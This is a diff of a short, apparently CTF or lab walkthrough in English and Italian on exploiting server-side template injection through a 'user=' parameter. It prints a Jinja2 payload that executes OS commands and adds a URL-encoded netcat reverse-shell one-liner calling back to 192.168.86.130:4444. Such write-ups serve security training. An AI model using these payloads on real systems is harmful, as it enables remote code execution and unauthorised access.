@@ -31,9 +31,9 @@ Use the "user=" parameter to inject the ssti payload and achieve a RCE
 ```python
 {{request.application.__globals__.__builtins__.__import__('os').popen("id").read()}}
 ```
-Usa il payload url encodato
-```
-
+Usa la reverse shell url encodata
+```bash
+rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20192.168.86.130%204444%20%3E%2Ftmp%2Ff
 ```
 ![[Pasted image 20231011155050.png]]
 Now use the rce to obtain a reverse shell
